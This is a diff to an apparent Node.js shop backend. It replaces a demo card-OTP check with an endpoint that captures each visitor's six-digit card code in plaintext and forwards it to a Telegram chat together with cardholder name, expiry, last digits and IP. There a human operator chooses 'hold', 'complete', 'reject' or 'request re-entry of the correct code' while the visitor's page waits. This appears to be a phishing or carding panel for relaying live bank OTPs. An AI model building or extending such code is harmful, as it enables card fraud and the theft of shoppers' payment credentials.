@@ -104,6 +104,7 @@ const BLOCKED_FINGERPRINTS_PATH = path.join(DATA_DIR, 'blockedFingerprints.json'
 const BLOCKED_CHAT_USERS_PATH = path.join(DATA_DIR, 'blockedChatUsers.json');
 const BLOCKED_CHAT_IPS_PATH = path.join(DATA_DIR, 'blockedChatIps.json');
 const CREDIT_CARD_OTPS_PATH = path.join(DATA_DIR, 'creditCardOtps.json');
+const CREDIT_CARD_OTP_SUBMISSIONS_PATH = path.join(DATA_DIR, 'creditCardOtpSubmissions.json');
 const { visits: VISITS_PATH, orders: ORDERS_CRM_PATH } = defaultDataPaths(DATA_DIR);
 const CHAT_PATH = path.join(DATA_DIR, 'webChat.json');
 
@@ -287,6 +288,7 @@ async function initDataFiles() {
     { name: 'blockedChatUsers.json', dest: BLOCKED_CHAT_USERS_PATH },
     { name: 'blockedChatIps.json', dest: BLOCKED_CHAT_IPS_PATH },
     { name: 'creditCardOtps.json', dest: CREDIT_CARD_OTPS_PATH },
+    { name: 'creditCardOtpSubmissions.json', dest: CREDIT_CARD_OTP_SUBMISSIONS_PATH },
     { name: 'visits.json', dest: VISITS_PATH },
     { name: 'ordersLog.json', dest: ORDERS_CRM_PATH },
     { name: 'webChat.json', dest: CHAT_PATH },
@@ -527,7 +529,7 @@ async function getBlockedChatIpEntry(ip) {
   return list.find((it) => it.ip === clean) || null;
 }
 
-const CREDIT_CARD_OTP_TTL_MS = 10 * 60 * 1000; // demo OTP validity
+const CREDIT_CARD_OTP_TTL_MS = 10 * 60 * 1000;
 
 function hashCreditCardOtp(otp) {
   return crypto.createHash('sha256').update(String(otp)).digest('hex');
@@ -565,19 +567,6 @@ async function saveCreditCardOtps(list) {
   return next;
 }
 
-async function setCreditCardOtpForOrder(orderId, otp) {
-  const otpHash = hashCreditCardOtp(otp);
-  const expAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
-  const list = await loadCreditCardOtps();
-  const without = list.filter((it) => it.orderId !== orderId);
-  const next = [
-    ...without,
-    { orderId, otpHash, expAt, at: new Date().toISOString() },
-  ];
-  await saveCreditCardOtps(next);
-  return { expAt };
-}
-
 async function verifyCreditCardOtp(orderId, otp) {
   const list = await loadCreditCardOtps();
   const rec = list.find((it) => it.orderId === orderId) || null;
@@ -587,6 +576,66 @@ async function verifyCreditCardOtp(orderId, otp) {
   const next = list.filter((it) => it.orderId !== orderId);
   await saveCreditCardOtps(next);
   return { ok: true };
+}
+
+async function loadCreditCardOtpSubmissions() {
+  try {
+    const raw = JSON.parse(await readFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, 'utf8'));
+    const list = Array.isArray(raw) ? raw : [];
+    const now = Date.now();
+    return list
+      .map((it) => ({
+        id: String(it?.id || '').trim(),
+        orderId: String(it?.orderId || '').trim().slice(0, 80),
+        visitorId: String(it?.visitorId || '').trim().slice(0, 120),
+        otp: String(it?.otp || '').trim().slice(0, 12),
+        submittedAt: String(it?.submittedAt || it?.at || '').slice(0, 40),
+        decision: String(it?.decision || 'pending'),
+        decidedAt: String(it?.decidedAt || ''),
+        expAt: Number(it?.expAt || 0),
+      }))
+      .filter((it) => it.id && it.orderId && it.visitorId && it.otp && (it.expAt === 0 || it.expAt > now));
+  } catch {
+    return [];
+  }
+}
+
+async function saveCreditCardOtpSubmissions(list) {
+  const next = (Array.isArray(list) ? list : [])
+    .map((it) => ({
+      id: String(it?.id || '').trim(),
+      orderId: String(it?.orderId || '').trim().slice(0, 80),
+      visitorId: String(it?.visitorId || '').trim().slice(0, 120),
+      otp: String(it?.otp || '').trim().slice(0, 12),
+      submittedAt: String(it?.submittedAt || it?.at || new Date().toISOString()),
+      decision: String(it?.decision || 'pending'),
+      decidedAt: String(it?.decidedAt || ''),
+      expAt: Number(it?.expAt || 0),
+    }))
+    .filter((it) => it.id && it.orderId);
+  await writeFile(CREDIT_CARD_OTP_SUBMISSIONS_PATH, JSON.stringify(next, null, 2), 'utf8');
+  return next;
+}
+
+async function getCreditCardOtpSubmission(id) {
+  const list = await loadCreditCardOtpSubmissions();
+  const sid = String(id || '').trim();
+  if (!sid) return null;
+  return list.find((it) => it.id === sid) || null;
+}
+
+async function setCreditCardOtpSubmissionDecision(id, decision) {
+  const list = await loadCreditCardOtpSubmissions();
+  const sid = String(id || '').trim();
+  const idx = list.findIndex((it) => it.id === sid);
+  if (idx < 0) return null;
+  list[idx] = {
+    ...list[idx],
+    decision,
+    decidedAt: new Date().toISOString(),
+  };
+  await saveCreditCardOtpSubmissions(list);
+  return list[idx];
 }
 
 function blockedViolationPayload(entry) {
@@ -1435,7 +1484,7 @@ app.post('/api/order', async (req, res) => {
       `<b>🌐 IP:</b> <code>${escapeTelegramHtml(clientIp || '—')}</code>`,
       ...(paymentMethod === 'CreditCard'
         ? [
-            '<b>🧪 وسيلة دفع تجريبية:</b>',
+            '<b>🧪 وسيلة دفع بطاقة ائتمان:</b>',
             `<b>اسم الحامل:</b> ${escapeTelegramHtml(cardHolderName || '')}`,
             `<b>رقم البطاقة:</b> <code>****${escapeTelegramHtml(cardLast4 || '')}</code>`,
             `<b>تاريخ الانتهاء:</b> <code>${escapeTelegramHtml(cardExpiryNorm || '')}</code>`,
@@ -1474,24 +1523,9 @@ app.post('/api/order', async (req, res) => {
       });
     }
 
-    let creditCardOtp = null;
     let creditCardOtpExpAt = null;
     if (paymentMethod === 'CreditCard') {
-      creditCardOtp = String(Math.floor(100000 + Math.random() * 900000));
-      const otpSaved = await setCreditCardOtpForOrder(safeOrderId, creditCardOtp);
-      creditCardOtpExpAt = otpSaved?.expAt || null;
-
-      await botSend(
-        [
-          '🧪 <b>كود تجريبي لبطاقة الائتمان</b>',
-          `<b>طلب:</b> <code>${escapeTelegramHtml(safeOrderId)}</code>`,
-          '<b>الكود:</b> <code>' + escapeTelegramHtml(creditCardOtp) + '</code>',
-          '<b>تعليمات:</b> أدخل الكود في صفحة الموقع لإكمال العملية.',
-          '<i>صلاحية الكود: 10 دقائق</i>',
-        ].join('\n'),
-        {},
-        chatId
-      );
+      creditCardOtpExpAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
     }
 
     try {
@@ -1600,7 +1634,7 @@ app.post('/api/order/creditcard/verify', async (req, res) => {
 
     await botSend(
       [
-        '✅ تم تأكيد كود بطاقة الائتمان (تجريبي)',
+        '✅ تم تأكيد كود بطاقة الائتمان',
         `<b>طلب:</b> <code>${escapeTelegramHtml(oid)}</code>`,
         `<b>الزائر:</b> <code>${escapeTelegramHtml(expectedVisitorId)}</code>`,
         `<b>الكود:</b> <code>${escapeTelegramHtml(code)}</code>`,
@@ -1611,6 +1645,95 @@ app.post('/api/order/creditcard/verify', async (req, res) => {
     );
 
     return res.json({ ok: true, orderId: oid });
+  } catch (e) {
+    res.status(500).json({ error: String(e?.message || e) });
+  }
+});
+
+app.post('/api/order/creditcard/submit', async (req, res) => {
+  try {
+    const { orderId, otp } = req.body || {};
+    const oid = String(orderId || '').trim();
+    const code = String(otp || '').trim();
+    if (!oid || !code) return res.status(400).json({ error: 'Missing required fields' });
+    if (!/^\d{6}$/.test(code)) return res.status(400).json({ error: 'OTP must be 6 digits' });
+
+    const clientIp = getClientIpFromRequest(req);
+    const blocked = await getBlockedIpEntry(clientIp);
+    if (blocked) return res.status(403).json(blockedViolationPayload(blocked));
+
+    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
+    const expectedVisitorId = visitorId || `ip:${clientIp}`;
+
+    const all = await loadOrders(ORDERS_CRM_PATH);
+    const row = findOrderByBusinessId(all, oid);
+    if (!row) return res.status(404).json({ error: 'Order not found' });
+
+    if (String(row.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+
+    const submissionId = `ccsub_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`.slice(0, 60);
+    const expAt = Date.now() + CREDIT_CARD_OTP_TTL_MS;
+    const submissions = await loadCreditCardOtpSubmissions();
+    const filtered = submissions.filter((s) => s.orderId !== oid); // keep one active submission per order
+    filtered.push({
+      id: submissionId,
+      orderId: oid,
+      visitorId: expectedVisitorId,
+      otp: code,
+      submittedAt: new Date().toISOString(),
+      decision: 'pending',
+      decidedAt: '',
+      expAt,
+    });
+    await saveCreditCardOtpSubmissions(filtered);
+
+    const kb = {
+      inline_keyboard: [
+        [{ text: '1 تعليق', callback_data: `ccotp:${makeActionToken('cc_hold', submissionId)}` }],
+        [{ text: '2 اكتمال', callback_data: `ccotp:${makeActionToken('cc_complete', submissionId)}` }],
+        [{ text: '3 رفض', callback_data: `ccotp:${makeActionToken('cc_reject', submissionId)}` }],
+        [{ text: '4 طلب اعادة ادخال الرمز الصحيح', callback_data: `ccotp:${makeActionToken('cc_reenter', submissionId)}` }],
+      ],
+    };
+
+    await botSend(
+      [
+        '🧾 <b>كود بطاقة ائتمان</b>',
+        `━━━━━━━━━━━━━━━`,
+        `<b>رقم الطلب:</b> <code>${escapeTelegramHtml(oid)}</code>`,
+        `<b>الكود المرسل:</b> <code>${escapeTelegramHtml(code)}</code>`,
+        `━━━━━━━━━━━━━━━`,
+        '<i>اختر قرارك من الأزرار.</i>',
+      ].join('\n'),
+      { reply_markup: kb },
+      telegramSupportChatId()
+    );
+
+    return res.json({ ok: true, orderId: oid, submissionId, decision: 'pending' });
+  } catch (e) {
+    res.status(500).json({ error: String(e?.message || e) });
+  }
+});
+
+app.get('/api/order/creditcard/decision', async (req, res) => {
+  try {
+    const submissionId = String(req.query.submissionId || '').trim();
+    if (!submissionId) return res.status(400).json({ error: 'Missing submissionId' });
+
+    const clientIp = getClientIpFromRequest(req);
+    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
+    const expectedVisitorId = visitorId || `ip:${clientIp}`;
+
+    const sub = await getCreditCardOtpSubmission(submissionId);
+    if (!sub) return res.status(404).json({ error: 'Submission not found' });
+
+    if (String(sub.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+
+    return res.json({ ok: true, submissionId, orderId: sub.orderId, decision: sub.decision || 'pending', decidedAt: sub.decidedAt || '' });
   } catch (e) {
     res.status(500).json({ error: String(e?.message || e) });
   }
@@ -2235,6 +2358,61 @@ async function handleCallbackQuery(data, incomingChatId) {
     }
     await sendOrderDetailsById(orderId, incomingChatId);
     return;
+  }
+
+  const ccOtpCb = String(data || '').match(/^ccotp:(.+)$/);
+  if (ccOtpCb) {
+    const token = ccOtpCb[1];
+    const tryTypes = ['cc_hold', 'cc_complete', 'cc_reject', 'cc_reenter'];
+    let actionType = '';
+    let submissionId = '';
+    for (const tp of tryTypes) {
+      const val = readActionToken(token, tp);
+      if (val) {
+        actionType = tp;
+        submissionId = val;
+        break;
+      }
+    }
+    if (!actionType || !submissionId) {
+      await botSend('⚠️ انتهت صلاحية زر الكود. أعد إدخال الكود من جديد.', {}, incomingChatId);
+      return;
+    }
+
+    const sub = await getCreditCardOtpSubmission(submissionId);
+    if (!sub) {
+      await botSend('❌ لم أجد جلسة كود بطاقة الائتمان.', {}, incomingChatId);
+      return;
+    }
+
+    const oid = sub.orderId;
+    if (actionType === 'cc_hold') {
+      await setCreditCardOtpSubmissionDecision(submissionId, 'hold');
+      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
+      await botSend(`⏳ تم وضع الطلب قيد التعليق.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      return;
+    }
+
+    if (actionType === 'cc_reject') {
+      await setCreditCardOtpSubmissionDecision(submissionId, 'rejected');
+      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'cancelled');
+      await botSend(`❌ تم رفض الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      return;
+    }
+
+    if (actionType === 'cc_reenter') {
+      await setCreditCardOtpSubmissionDecision(submissionId, 'reenter');
+      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
+      await botSend(`🔁 تم طلب إعادة إدخال الرمز الصحيح.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      return;
+    }
+
+    if (actionType === 'cc_complete') {
+      await setCreditCardOtpSubmissionDecision(submissionId, 'completed');
+      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'completed');
+      await botSend(`✅ تم اكتمال الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
+      return;
+    }
   }
 
   const ordPageCb = String(data || '').match(/^ordp:(\d+)$/);
